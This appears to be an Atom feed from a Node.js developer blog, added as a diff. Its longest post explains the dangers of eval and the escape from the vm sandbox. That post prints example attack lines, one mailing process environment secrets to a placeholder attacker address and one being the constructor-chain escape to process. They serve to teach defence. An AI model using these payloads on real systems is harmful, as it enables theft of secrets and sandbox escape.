@@ -1,0 +1,774 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title><![CDATA[Category: Nodejs | Alessandro Nadalin]]></title>
+  <link href="https://odino.org/categories/nodejs/atom.xml" rel="self"/>
+  <link href="https://odino.org/"/>
+  <updated>2021-04-15T11:32:06+00:00</updated>
+  <id>https://odino.org/</id>
+  <author>
+    <name><![CDATA[Alessandro Nadalin]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Generating a MD5 Hash in NodeJS]]></title>
+    <link href="https://odino.org/generating-the-md5-hash-of-a-string-in-nodejs/"/>
+    <updated>2018-11-30T17:36:00+00:00</updated>
+    <id>https://odino.org/generating-the-md5-hash-of-a-string-in-nodejs</id>
+    <content type="html"><![CDATA[<p>A few days ago I wanted to integrate gravatar in
+one of the applications I'v been working on, and
+realized gravatar still uses MD5 for hashing the
+user&rsquo;s email.</p>
+
+<!-- more -->
+
+
+<p>I was wondering whether I would need
+an <a href="https://www.npmjs.com/package/md5">external module</a>
+to generate the hash, but quickly realized the native
+<code>crypto</code> can do the trick:</p>
+
+<p>``` js
+const crypto = require(&lsquo;crypto&rsquo;)</p>
+
+<p>let hash = crypto.createHash(&lsquo;md5&rsquo;).update(&lsquo;some_string&rsquo;).digest(&ldquo;hex&rdquo;)
+```</p>
+
+<p>It really doesn&rsquo;t get any easier than that &mdash; adios!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Book Review: Node.js Design Patterns (1st Edition)]]></title>
+    <link href="https://odino.org/book-review-node-dot-js-design-patterns/"/>
+    <updated>2018-06-15T09:56:00+00:00</updated>
+    <id>https://odino.org/book-review-node-dot-js-design-patterns</id>
+    <content type="html"><![CDATA[<p>This is a book that was recommended to me by one of my former colleagues, but
+turned out to be pretty disappointing.</p>
+
+<!-- more -->
+
+
+<p><img class="right" src="/images/node-dp-book.png"></p>
+
+<p><a href="https://www.amazon.com/Node-js-Design-Patterns-Mario-Casciaro/dp/1783287314">Node.js design patterns</a>
+gives you a few interesting pointers, like a complete overview of streams or implementing
+a service locator / container in Node &mdash; but to me it feels like that most of the
+topics covered in the book are either too basic or general (on a side note: most
+of the code / explanations are still relevant <strong>because</strong> they&rsquo;re generic, and
+that&rsquo;s a plus).</p>
+
+<p>I think it might be that the book is intended for a different audience, so I won&rsquo;t
+make too many assumptions or criticize the book too much. In addition, there&rsquo;s
+a <a href="https://www.packtpub.com/web-development/nodejs-design-patterns-second-edition">2nd edition</a>,
+with an additional <a href="https://twitter.com/loige?lang=en">author</a>, that has come out
+in 2016, so it might be that the newer edition kicks asses (the person that recommended me this read had the 2nd edition, but I
+wasn&rsquo;t aware when I bought the book).</p>
+
+<p>&hellip;if only I had known :)</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[The Simplest Template Engine for NodeJS]]></title>
+    <link href="https://odino.org/the-simplest-template-engine-for-nodejs/"/>
+    <updated>2018-03-23T17:59:00+00:00</updated>
+    <id>https://odino.org/the-simplest-template-engine-for-nodejs</id>
+    <content type="html"><![CDATA[<p>This is the story of how I decided to dump <a href="https://mozilla.github.io/nunjucks/">nunjucks</a> and use the best
+templating engine hack in the world.</p>
+
+<p>&hellip;with one line of code.</p>
+
+<!-- more -->
+
+
+<h2>Background</h2>
+
+<p>Node does not seem to have a <a href="https://github.com/tj/consolidate.js/#supported-template-engines">clear-cut winner</a> when it comes to template engines &mdash;
+for the longest time, I banked on nunjucks but I&rsquo;ve been wondering if there&rsquo;s
+something <em>simpler</em> to take care of templating in small apps.
+I&rsquo;m not really bashing nunjucks here, I&rsquo;m simply wondering if anything else can
+get the job done without too much fuss.</p>
+
+<h2>Mounting the hack</h2>
+
+<p>Armed with an <a href="https://expressjs.com/">express</a>, a couple
+routes, 2 database queries and more documentation in the README than LoCs, I
+started writing the following:</p>
+
+<p>``` js
+app.get(&ldquo;/my-view&rdquo;, async (req, res) => {
+  res.send(render(&ldquo;my-view&rdquo;, {data: await db.getData()}))
+})</p>
+
+<p>function render(view, ctx = {}) {
+  return fs.readFileSync(<code>./views/${view}.html</code>) // WTF do I do with ctx?
+}
+```</p>
+
+<p>That&rsquo;s amazing, I just called a file reader a &ldquo;template engine&rdquo;!</p>
+
+<p>Knowing that rendering a file from the filesystem doesn&rsquo;t cut it (we need to pass and interpret variables etc etc), I then looked
+to find the most straighforward template engine on the planet and realized <a href="https://lodash.com/docs/4.17.5">lodash</a>
+has a built-in <a href="https://lodash.com/docs/4.17.5#template">_.template</a> method:</p>
+
+<p><code>js
+var compiled = _.template('hello ${ user }!');
+compiled({ 'user': 'tommy' });
+// =&gt; 'hello tommy!'
+</code></p>
+
+<p>Just what I needed &mdash; the syntax is not the jinja one but it mirrors
+template strings, so I can&rsquo;t complain too much.</p>
+
+<p>Let&rsquo;s put everything together:</p>
+
+<p>``` js
+app.get(&ldquo;/my-view&rdquo;, async (req, res) => {
+  res.send(render(&ldquo;my-view&rdquo;, {data: await db.getData()}))
+})</p>
+
+<p>function render(view, ctx = {}) {
+  return _.template(fs.readFileSync(<code>./views/${view}.html</code>))(ctx)
+}
+```</p>
+
+<p>Sure, we don&rsquo;t call <code>res.render</code>, but the difference is very minimal
+(<code>.render(tpl, ctx)</code> vs <code>.send(render(tpl, ctx))</code>).</p>
+
+<p><strong>Done. No more. That&rsquo;s it.</strong></p>
+
+<h2>Lessons learned</h2>
+
+<p><strong>I can be a pretty good liar</strong>: I didn&rsquo;t build a template engine, I simply took advantage
+of lodash' own minimalist <code>.template</code> method.</p>
+
+<p>At the same time, though, I love
+the fact that I&rsquo;m using a library I anyhow require 99% of the times I&rsquo;m working in node
+and I don&rsquo;t need extra dependencies. It definitely can&rsquo;t do everything nunjucks
+does, but, when all you need is rendering a couple templates from your application,
+this approach works well enough.</p>
+
+<p>And to those who are going to tell me what <code>fs.readFileSync</code> is bad I say: <em>well, it depends</em>.</p>
+
+<p>Do you need to render hundreds of templates per second? Then sure, <code>readFileSync</code>
+isn&rsquo;t the most optimized way of doing things. But in a low-traffic, internal app,
+this just fits the bill.</p>
+
+<p>Adios!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Debugging NodeJS Applications From Your Browser]]></title>
+    <link href="https://odino.org/debugging-nodejs-applications-from-your-browser/"/>
+    <updated>2017-04-12T17:31:00+00:00</updated>
+    <id>https://odino.org/debugging-nodejs-applications-from-your-browser</id>
+    <content type="html"><![CDATA[<p><img class="right" src="/images/chrome-node-debug.png"></p>
+
+<p>If you&rsquo;ve worked with Node long enough, chances are you probably grew fed up with the lack
+of <em>plug-and-play</em> benchmarking and profiling tools in its ecosystem: well, at
+least for debugging, say no more!</p>
+
+<p>One of the most overlooked features that landed in Node over
+the past year is <a href="https://github.com/nodejs/node/pull/6792">enhanced debuggability</a>
+which, coupled with Chrome&rsquo;s DevTools, makes it extremely easy
+to debug and profile server-side JavaScript: it comes with full support of the
+<em>usual suspects</em> such as <strong>breakpoints</strong> and <strong>CPU profiles</strong>, and it&rsquo;s
+extremely easy to setup &mdash; no external dependency, no overhead, just Chrome.</p>
+
+<!-- more -->
+
+
+<p>The trick is very simple, as you just need to launch your node scrips with the
+<code>--inspect</code> flag!</p>
+
+<p>Say you have an HTTP server up &amp; running on port 8080:</p>
+
+<p>``` js index.js
+require(&lsquo;http&rsquo;).createServer((req, res) => {</p>
+
+<pre><code>console.log('Hello')
+res.write('Oh my ')
+res.end('gosh!')
+</code></pre>
+
+<p>}).listen(8080)
+```</p>
+
+<p>you simply need to start it with <code>node --inspect index.js</code> and head to the URL
+pointed out by the command line, something like:</p>
+
+<p>``` bash
+/tmp ᐅ node &mdash;inspect index.js
+Debugger listening on port 9229.
+Warning: This is an experimental feature and could change at any time.
+To start debugging, open the following URL in Chrome:</p>
+
+<pre><code>chrome-devtools://devtools/bundled/inspector.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:9229/737e256b-8640-4331-a145-27a119ba43c8
+</code></pre>
+
+<p>```</p>
+
+<p>Needless to say, if you want to pick a specific port, you just need to tweak
+the <em>inspect</em> option with something like <code>--inspect=4000</code><sup id='fnref:1'><a href='#fn:1' rel='footnote'>1</a></sup>.</p>
+
+<p>See you next time!</p>
+
+<p><div class="footnotes">
+<span>
+Notes
+</span>
+	<ol>
+		<li id='fn:1'>At Namshi, most of us develop on remote machines (EC2 in Mumbai) and we only expose a handful of ports from those machines, so we run our debuggers on more &ldquo;common&rdquo; ports such as 8090 <a href='#fnref:1' rev='footnote'>↩</a></li>
+	</ol>
+</div>
+</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Eval No More: A Journey Through NodeJS' VM Module, VM2 and Expression Language]]></title>
+    <link href="https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/"/>
+    <updated>2017-03-04T21:28:00+00:00</updated>
+    <id>https://odino.org/eval-no-more-understanding-vm-vm2-nodejs</id>
+    <content type="html"><![CDATA[<p>How many times have you heard of <a href="https://www.google.ae/search?q=eval&amp;oq=eval&amp;aqs=chrome..69i57j69i60l3j0l2.673j0j7&amp;sourceid=chrome&amp;ie=UTF-8#q=eval+is+evil">how evil eval is</a>? Are there safer alternatives in the modern, server-side JavaScript ecosystem?</p>
+
+<!-- more -->
+
+
+<h2>The problem with eval</h2>
+
+<p><img class="right" src="/images/security.png"></p>
+
+<p><code>eval</code> is not necessary evil &mdash; you <em>just</em> need to make sure you&rsquo;re dealing with
+trusted inputs.</p>
+
+<p>The problem lies in that &ldquo;just&rdquo;, as you can&rsquo;t 100% guarantee that the source of
+the eval-ed code (a DB, a file) won&rsquo;t get compromised at any point in time.</p>
+
+<p>Long story short: <strong>consider all code that goes through an <code>eval</code> untrusted</strong>.</p>
+
+<p>Here&rsquo;s some funny things <code>eval</code> can do:</p>
+
+<p>``` js
+// Guess what?
+eval(&lsquo;while(true) console.log(1)&rsquo;)
+console.log(&lsquo;The application goes on&hellip;&rsquo;)</p>
+
+<p>// What if the attacker doesn&rsquo;t want to waste time?
+eval(&lsquo;process.exit(0)&rsquo;)
+console.log(&lsquo;The application goes on&hellip;&rsquo;)</p>
+
+<p>// Let&rsquo;s escalate&hellip;
+eval(&lsquo;require(&ldquo;node-mailer&rdquo;).mail(&ldquo;<a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x61;&#116;&#x74;&#x61;&#99;&#x6b;&#x65;&#114;&#64;&#101;&#x78;&#97;&#x6d;&#112;&#108;&#x65;&#46;&#x63;&#111;&#109;">&#97;&#x74;&#x74;&#97;&#x63;&#107;&#101;&#x72;&#64;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#x65;&#46;&#99;&#x6f;&#109;</a>&rdquo;, JSON.stringify(process.ENV))&rsquo;)
+console.log(&lsquo;The application goes on&hellip;&rsquo;)</p>
+
+<p>// And, for the lolz:
+eval(&lsquo;eval = undefined&rsquo;)
+console.log(&lsquo;The application goes on&hellip;&rsquo;)
+```</p>
+
+<p>The last example is the one I like the most: there an attacker would re-define
+the <code>eval</code> function itself, causing the application to crash (<code>TypeError: eval is not a function</code>)
+the next time that block of code is executed.</p>
+
+<p>Now that we&rsquo;ve seen some basic examples on how you could easily tear down an
+application that uses <code>eval</code> too eagerly, let&rsquo;s take a step back and try
+to figure out when it could be a good idea to execute &ldquo;external&rdquo; code
+on-the-fly.</p>
+
+<h2>Free the code!</h2>
+
+<p>Ever heard of the <a href="https://en.wikipedia.org/wiki/Unified_Expression_Language">expression language</a>, or EL?</p>
+
+<p>It&rsquo;s kind of a specification that defines a programming language used to evaluate
+expressions such as:</p>
+
+<p><code>
+car.maker == 'BMW' // returns a bool
+</code></p>
+
+<p>as opposed to having to deal with the syntax and quirks of each and every language &mdash; think of
+PHP&rsquo;s <a href="http://phpsadness.com/">dollar sign and weird arrow-syntax</a>:</p>
+
+<p><code>php
+&lt;?php
+$car-&gt;getMaker() == 'BMW'
+</code></p>
+
+<p>Surround your pullquote like this {" text to be quoted "}</p>
+
+<p>``` yaml seo-rules.yml
+rules:
+  &ndash; expr: category(&ldquo;new articles&rdquo;) &amp;&amp; country(&ldquo;UK&rdquo;)</p>
+
+<pre><code>keywords: "latest news, London, Manchester"
+</code></pre>
+
+<ul>
+<li>expr: category(&ldquo;new articles&rdquo;) &amp;&amp; country(&ldquo;IT&rdquo;)
+keywords: &ldquo;ultime notizie, Roma, Milano&rdquo;
+&hellip;
+```</li>
+</ul>
+
+
+<p>You can then import it in your application and add keywords to your webpage based
+on those conditions &mdash; with code that would look like:</p>
+
+<p>``` js
+function category(title) {
+  return title === req.category.title
+}</p>
+
+<p>function country(code) {
+  return code === req.country
+}</p>
+
+<p>let keywords = &lsquo;&rsquo;
+let rules = parse(&lsquo;./rules.yml&rsquo;)</p>
+
+<p>rules.each(rule => {
+  try {</p>
+
+<pre><code>if (eval(rule.expr)) {
+  keywords += rule.keywords
+}
+</code></pre>
+
+<p>  } catch(err) {}
+})</p>
+
+<p>```</p>
+
+<p>The advantage of using an expression language is that you don&rsquo;t  need to build
+a full fledged CMS to customize various parts of your applications &mdash; import a
+file (or a spreadsheet) and you&rsquo;re done.</p>
+
+<p>Doing this in JavaScript is even easier, as expressions are, fundamentally, valid
+JS code that can be executed without the need of a <a href="http://symfony.com/doc/current/components/expression_language/extending.html">custom parser</a>.
+Let&rsquo;s take a look at some expressions from the <a href="http://symfony.com/doc/current/components/expression_language.html">Symfony2 website</a>:</p>
+
+<p>``` js
+product.stock &lt; 15</p>
+
+<p>article.commentCount > 100 &amp;&amp; article.category in [&ldquo;misc&rdquo;]</p>
+
+<p>data[&ldquo;life&rdquo;] + data[&ldquo;universe&rdquo;] + data[&ldquo;everything&rdquo;]</p>
+
+<p>life + universe + everything
+```</p>
+
+<p>These are all <strong>valid examples of JS code</strong>: some operators
+work a little bit differently (for example <code>in</code> will mainly  work with
+objects, not arrays) but, if you&rsquo;re not too creative, you can basically make
+sure your expressions are valid JS that can be executed without a custom
+parser<sup id='fnref:1'><a href='#fn:1' rel='footnote'>1</a></sup>.</p>
+
+<p>At <a href="https://en-ae.namshi.com/">Namshi</a>, for example, we allow our marketing
+team to create voucher codes based on expressions that look like:</p>
+
+<p><code>js
+expr: order_subtotal_by_brand("nike", 50, "USD")
+discount: 10
+type: percent
+</code></p>
+
+<p>(this would apply a 10% discount if the customer purchases at least 50 USD in Nike
+products)</p>
+
+<p>Now, you might think you just found the holy grail that allows you to avoid
+building a complicated CMS and let stakeholders write that code for you &mdash; so
+you start hacking around, come up with a prototype, everyone is extremely stoked
+and it goes into production within a few days. Now your SEO guy can customize
+all of the metatags in your pages by simply requesting you to deploy an updated
+version of <code>seo-rules.yml</code>.</p>
+
+<p>Then, <strong>disaster strikes</strong>.</p>
+
+<h2>Eval is not a sandbox</h2>
+
+<p><img class="right" src="/images/expression-language.jpg"></p>
+
+<p>Even assuming your SEO guy is responsible enough to not make basic mistakes such
+as toying around with the file and forgetting a <code>while</code> loop in one of the conditions,
+you&rsquo;re still facing a potentially high security threat &mdash; a user
+might steal the email credentials of our SEO hero and send you a new version of
+<code>seo-rules.yml</code> that contains dangerous code, asking you to deploy those changes
+urgently. Since you trust the SEO guy, you don&rsquo;t even review it, go live and&hellip;</p>
+
+<p>&hellip;good luck.</p>
+
+<p>Surround your pullquote like this {" text to be quoted "}</p>
+
+<h2>Enter VM</h2>
+
+<p>Now, imagine you could run some JS code in a new &ldquo;node process&rdquo; that has no access
+to the standard node library &mdash; no <code>process</code>, no <code>console</code>, just basic plain JS: that&rsquo;s
+what the <code>vm</code> module lets you do.</p>
+
+<p>Let&rsquo;s take a look at this example:</p>
+
+<p>``` js
+const vm = require(&lsquo;vm&rsquo;)</p>
+
+<p>let result = vm.runInNewContext(&lsquo;a + 1&rsquo;, {a: 2})</p>
+
+<p>console.log(result) // 3
+```</p>
+
+<p>Here we are asking Node to create a new <a href="https://nodejs.org/api/vm.html#vm_what_does_it_mean_to_contextify_an_object">V8 context</a> and run a bunch of code
+(<code>a + 1</code>) there for us, passing an object that constitutes the global environment of
+that new context (<code>{a: 2}</code>).</p>
+
+<p>Note that the current execution context is not affected by what happens in that
+new context:</p>
+
+<p>``` js
+let a = 0;
+let result = vm.runInNewContext(&lsquo;a += 1&rsquo;, {a})</p>
+
+<p>console.log(a) // 0
+```</p>
+
+<p>unless you specifically tell the VM that you want to re-use an existing context
+or to use the current context with <code>vm.runInThisContext</code>:</p>
+
+<p>``` js
+a = 0;
+vm.runInThisContext(&lsquo;a += 1&rsquo;)</p>
+
+<p>console.log(a) // 1
+```</p>
+
+<p>When you use the current execution context (<code>runInThisContext</code>)
+the executed code is going to have access to globally-defined variables of the current
+context which, of course, exposes us to the same kind of problems we&rsquo;d have with
+<code>eval</code>:</p>
+
+<p>``` js
+a = 0;
+let result = vm.runInThisContext(&lsquo;process.exit(0)&rsquo;)</p>
+
+<p>console.log(result) // this will never run
+```</p>
+
+<p>So, let&rsquo;s stick to running our code on brand new execution contexts through <code>vm.runInNewContext</code>.</p>
+
+<p>A nice &ldquo;feature&rdquo; of new contexts is that, by default, they can only be used to
+execute plain old JS, as they don&rsquo;t have access to functions / node modules
+unless <strong>you</strong> inject those in the context.</p>
+
+<p>You can try it out for yourself in node&rsquo;s REPL:</p>
+
+<p>``` js
+~ (master ✔) ᐅ node</p>
+
+<blockquote><p>vm.runInNewContext(&lsquo;1 + 1&rsquo;)
+2</p>
+
+<p>vm.runInNewContext(&lsquo;1 + a&rsquo;)
+ReferenceError: a is not defined</p>
+
+<pre><code>at evalmachine.&lt;anonymous&gt;:1:5
+at ContextifyScript.Script.runInContext (vm.js:37:29)
+at ContextifyScript.Script.runInNewContext (vm.js:43:15)
+at Object.exports.runInNewContext (vm.js:74:17)
+at repl:1:4
+at realRunInThisContextScript (vm.js:22:35)
+at sigintHandlersWrap (vm.js:98:12)
+at ContextifyScript.Script.runInThisContext (vm.js:24:12)
+at REPLServer.defaultEval (repl.js:346:29)
+at bound (domain.js:280:14)
+</code></pre>
+
+<p>vm.runInNewContext(&lsquo;1 + a&rsquo;, {a: 1})
+2</p>
+
+<p>vm.runInNewContext(&lsquo;console.log(123)&rsquo;)
+ReferenceError: console is not defined</p>
+
+<pre><code>at evalmachine.&lt;anonymous&gt;:1:1
+at ContextifyScript.Script.runInContext (vm.js:37:29)
+at ContextifyScript.Script.runInNewContext (vm.js:43:15)
+at Object.exports.runInNewContext (vm.js:74:17)
+at repl:1:4
+at realRunInThisContextScript (vm.js:22:35)
+at sigintHandlersWrap (vm.js:98:12)
+at ContextifyScript.Script.runInThisContext (vm.js:24:12)
+at REPLServer.defaultEval (repl.js:346:29)
+at bound (domain.js:280:14)
+</code></pre>
+
+<p>vm.runInNewContext(&lsquo;console.log(123)&rsquo;, {console})
+123
+undefined</p>
+
+<p>vm.runInNewContext(&lsquo;log(&ldquo;lol&rdquo;)&rsquo;, console)
+lol
+undefined</p>
+
+<p>```</p></blockquote>
+
+<p>One of the hidden features of the <code>vm</code> module is that it uses implicit returns,
+which means that <strong>the return value of the expression is available to the main
+execution context</strong>. As we&rsquo;ve already seen:</p>
+
+<p><code>js
+let result = vm.runInNewContext('Math.random() * 1000')
+console.log(result) // 802.4222332991689
+</code></p>
+
+<p>In fact, if you try to return &ldquo;manually&rdquo; you&rsquo;ll get a slap in the face:</p>
+
+<p><code>js
+let result = vm.runInNewContext('return Math.random() * 1000')
+...
+evalmachine.&lt;anonymous&gt;:1
+return Math.random() * 1000
+^^^^^^
+SyntaxError: Illegal return statement
+</code></p>
+
+<p>But implicit returns don&rsquo;t just stop there &mdash; as you can write multiple
+expressions and <code>vm</code> will make sure you get the return value of the last
+block, even if you split your &ldquo;code&rdquo; into multiple lines:</p>
+
+<p><code>js
+let code  = `
+let a = 1
+let b = a
+a + b
+`
+let result = vm.runInNewContext(code)
+console.log(result) // 2
+</code></p>
+
+<p>The other <strong>killer feature</strong> of the <code>vm</code> module is that it&rsquo;s able to <strong>specify
+timeouts for the scripts it executes</strong>:</p>
+
+<p><code>`` js
+vm.runInNewContext(</code>while (true) 1`, {}, {timeout: 3})</p>
+
+<p>Error: Script execution timed out.</p>
+
+<pre><code>at ContextifyScript.Script.runInContext (vm.js:37:29)
+at ContextifyScript.Script.runInNewContext (vm.js:43:15)
+at Object.exports.runInNewContext (vm.js:74:17)
+at repl:1:4
+at realRunInThisContextScript (vm.js:22:35)
+at sigintHandlersWrap (vm.js:98:12)
+at ContextifyScript.Script.runInThisContext (vm.js:24:12)
+at REPLServer.defaultEval (repl.js:346:29)
+at bound (domain.js:280:14)
+at REPLServer.runBound [as eval] (domain.js:293:12)
+</code></pre>
+
+<p>```</p>
+
+<p>In the above scenario, we&rsquo;re giving the script 3 milliseconds to execute
+and, since it&rsquo;s trying to execute an infinite <code>while</code> loop, <code>vm</code> throws
+an error and gives us an opportunity to catch it:</p>
+
+<p>``` js
+try {</p>
+
+<pre><code>return vm.runInNewContext(`while (true) 1`, {}, {timeout: 3})
+</code></pre>
+
+<p>} catch(err) {</p>
+
+<pre><code>// err could be a syntax error, timeout, etc
+console.error(err)
+
+return null
+</code></pre>
+
+<p>}
+```</p>
+
+<p>It&rsquo;s worth noting that the VM API is synchronous, so please be mindful
+when assigning timeouts as you might end up stalling for too long.</p>
+
+<h2>Performance overhead</h2>
+
+<p>Surround your pullquote like this {" text to be quoted "}</p>
+
+<p>In addition, I truly don&rsquo;t think you&rsquo;ll be evaluating thousands of expressions
+on every request, so the slowdown of using the VM module might look more
+like this:</p>
+
+<p>``` bash
+/tmp ᐅ node</p>
+
+<blockquote><p>console.time(&lsquo;r&rsquo;); vm.runInNewContext(&lsquo;1 + 1&rsquo;, {}); console.timeEnd(&lsquo;r&rsquo;)
+r: 1.778ms
+```</p></blockquote>
+
+<p>Still expensive, but very minimal in the context of a request / response cycle<sup id='fnref:4'><a href='#fn:4' rel='footnote'>4</a></sup>.</p>
+
+<h2>Are we good to go using VM? Surprise surprise!</h2>
+
+<p><img class="right" src="/images/facepalm.jpg"></p>
+
+<p>You came all the way down here thinking <code>vm</code> solved all of your problems, just
+like I did: when it comes to security, though, I always want to double and triple
+check to make sure I&rsquo;m really considering the safest solution and, after some
+digging around, I had one of those facepalm moments, as <strong>vm might not be safe
+enough</strong>.</p>
+
+<p>Consider this trick:</p>
+
+<p><code>js
+vm.runInNewContext("this.constructor.constructor('return process')().exit()")
+console.log("The app goes on...")
+</code></p>
+
+<p>Unfortunately, this is a valid exploit that will likely never get fixed &mdash; the
+VM module is to be considered <a href="https://github.com/nodejs/node-v0.x-archive/issues/2486#issuecomment-3420936">a sandbox, not a jail</a>,
+meaning that it can&rsquo;t really screw around with the current context but it can
+very well access the standard JS APIs and the global NodeJS environment, providing a straightforward attack vector
+similar to what you&rsquo;d end up with by using <code>eval</code>.</p>
+
+<p>One way to make sure that VM can&rsquo;t use this funny trick to access globals is by
+making sure the context is only made of primitives:</p>
+
+<p><code>js
+let ctx = Object.create(null)
+ctx.a = 1
+vm.runInNewContext("this.constructor.constructor('return process')().exit()", ctx)
+</code></p>
+
+<p>What we&rsquo;re doing here is to create a &ldquo;special&rdquo; context that does not have a
+prototype (<code>Object.create(null)</code>), thus removing the ability to access
+constructors and prototypes:</p>
+
+<p>``` js
+vm.runInNewContext(&ldquo;this.constructor.constructor(&lsquo;return process&rsquo;)().exit()&rdquo;, ctx)</p>
+
+<p>// same as</p>
+
+<p>vm.runInNewContext(&ldquo;this.<strong>proto</strong>.constructor.constructor(&lsquo;return process&rsquo;)().exit()&rdquo;, ctx)
+```</p>
+
+<p>The above code will throw the <code>ReferenceError: process is not defined</code> error, but will
+still be vulnerable if we add non-primitives in the context:</p>
+
+<p><code>js
+let ctx = Object.create(null)
+ctx.a = function(){}
+vm.runInNewContext("this.a.constructor.constructor('return process')().exit()", ctx)
+</code></p>
+
+<p>Unless you can afford to only use primitives in our context, we&rsquo;re back to square
+one, left with no way to safely execute untrusted JS code.</p>
+
+<p>And, by the way, this isn&rsquo;t likely to change soon as it&rsquo;s been <a href="http://grokbase.com/t/gg/nodejs/1273tqtcsk/sandboxing-using-vm-module-wrapping-require-process-binding">there for ages</a>.
+Worse of all, most people still assume <code>vm</code> is safe (see <a href="https://github.com/hacksparrow/safe-eval#what-is-this">here</a>
+and <a href="https://www.quora.com/What-are-the-use-cases-for-the-Node-js-vm-core-module">here</a>),
+which means there might be tons of applications out there that are vulnerable to
+this kind of attack.</p>
+
+<h2>Enter VM2</h2>
+
+<p>As I briefly explained in the previous paragraph, I was doing some digging
+around to see if <code>vm</code>&rsquo;s sandbox could still be exploited when I found myself
+on <a href="https://gist.github.com/domenic/d15dfd8f06ae5d1109b0">this gist</a> which
+eventually led me to the <a href="https://github.com/patriksimek/vm2">VM2 library on github</a>.</p>
+
+<p>Curious on what would this module add on top of <code>vm</code>&rsquo;s default behavior,
+<a href="https://github.com/patriksimek/vm2/issues/59">I asked</a>
+only to find that it actually secures the sandbox through some custom security checks (mainly using <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy">proxies</a>):</p>
+
+<p>``` bash
+/tmp ᐅ node</p>
+
+<blockquote><p>const {VM} = require(&lsquo;vm2&rsquo;);
+undefined</p>
+
+<p>new VM().run(&lsquo;this.constructor.constructor(&ldquo;return process&rdquo;)().exit()&rsquo;);
+ReferenceError: process is not defined</p>
+
+<pre><code>at eval (eval at &lt;anonymous&gt; (vm.js:1:18), &lt;anonymous&gt;:2:8)
+at vm.js:1:47
+at ContextifyScript.Script.runInContext (vm.js:32:29)
+at VM.run (/tmp/node_modules/vm2/lib/main.js:145:72)
+at repl:1:10
+at ContextifyScript.Script.runInThisContext (vm.js:23:33)
+at REPLServer.defaultEval (repl.js:336:29)
+at bound (domain.js:280:14)
+at REPLServer.runBound [as eval] (domain.js:293:12)
+at REPLServer.onLine (repl.js:533:10)
+</code></pre>
+
+<p>```</p></blockquote>
+
+<p>Sweet &mdash; we can simply then install <a href="https://www.npmjs.com/package/vm2">VM2</a>
+and start switching all <code>vm.runInNewContext(...)</code> to VM2&rsquo;s API:</p>
+
+<p>``` js
+let vm = new VM({timeout: 10, sandbox: {a: function(){ return 123 }}})</p>
+
+<p>vm.run(&lsquo;a()&rsquo;) // 123
+```</p>
+
+<p>At this point you could probably settle on VM2 and call it a day, but you&rsquo;d still
+need to ask yourself &ldquo;<em>what if VM2 contains a vulnerability?</em>&rdquo;.</p>
+
+<p>All in all, there have been a few <a href="https://github.com/patriksimek/vm2/issues/32">security concerns</a> with this module as well,
+and similar libraries <a href="https://github.com/asvd/jailed/issues/33">had the same problems</a>
+&mdash; to be honest, my gut feeling is that <a href="https://github.com/patriksimek/vm2/issues/32#issuecomment-226581203">a new attack vector
+might be out there, waiting to be discovered</a>.</p>
+
+<h2>Conclusion</h2>
+
+<p>It&rsquo;s been quite a long read if you&rsquo;ve made it this far, so let me leave you
+with some key takeaways:</p>
+
+<ul>
+<li>there are business cases for evaluating external code, on-the-fly</li>
+<li>avoid using <code>eval</code> for that, it&rsquo;s <strong>not safe at all</strong></li>
+<li>node&rsquo;s <code>vm</code> module provides a safer implementation, but <strong>it can still be exploited</strong> by an attacker</li>
+<li><a href="https://github.com/patriksimek/vm2">VM2</a> appears to provide a more solid sandbox that can&rsquo;t be escaped, but a security issue might lurk <a href="https://github.com/patriksimek/vm2/issues/32">somewhere in the codebase</a>&hellip;</li>
+</ul>
+
+
+<p>All in all I think the only safe way to run untrusted code is to &ldquo;physically&rdquo;
+separate your application from that code by, for example, running it in a VM, a docker
+container or a <a href="http://docs.aws.amazon.com/lambda/latest/dg/API_Invoke.html">lambda function</a> on AWS<sup id='fnref:5'><a href='#fn:5' rel='footnote'>5</a></sup>.
+If you can&rsquo;t go for this kind of isolation, then I would recommend you to settle
+on VM2.</p>
+
+<h2>Last but not least: what about the browser?</h2>
+
+<p>Some believe <a href="http://stackoverflow.com/a/198031/934439">eval isn&rsquo;t such a threat</a>
+on the browser, as most clients can anyhow do the same kind of harm through the
+DevTools' console. Even though, in principle, that&rsquo;s true, there are some <a href="http://stackoverflow.com/questions/197769/when-is-javascripts-eval-not-evil#comment19416896_198031">other
+things to consider</a>
+that might still make <code>eval</code> a risky element of your codebase.</p>
+
+<p>One very interesting approach is to use <a href="http://blog.namangoel.com/replacing-eval-with-a-web-worker">web workers</a>,
+as they provide a semi-isolated context that cannot interfere with the original
+window.</p>
+
+<p>That said, there&rsquo;s still a long way to go until we can safely run an
+untrusted piece of code, both on the client and the server.</p>
+
+<p>Perhaps that&rsquo;s for the best ;&ndash;)</p>
+
+<p><div class="footnotes">
+<span>
+Notes
+</span>
+	<ol>
+		<li id='fn:1'>Another example, you should use &lsquo;&amp;&amp;&rsquo; and not &lsquo;and&rsquo; <a href='#fnref:1' rev='footnote'>↩</a></li><li id='fn:2'>including the global one because you can just use global.$VAR in Node ¯\<em>(ツ)</em>/¯ <a href='#fnref:2' rev='footnote'>↩</a></li><li id='fn:3'>console.time|timeEnd are amazing for this kind of quick benchmarks <a href='#fnref:3' rev='footnote'>↩</a></li><li id='fn:4'>Unless you are, of course, optimizing for each and every ms. In general, I tend to forget about these optimizations as the bottleneck is usually somewhere in the network, or a DB query, so optimizing for that won&rsquo;t really move the needle <a href='#fnref:4' rev='footnote'>↩</a></li><li id='fn:5'>Using lambda for this would actually make it for a cool proof of concept <a href='#fnref:5' rev='footnote'>↩</a></li>
+	</ol>
+</div>
+</p>
+]]></content>
+  </entry>
+  
+</feed>
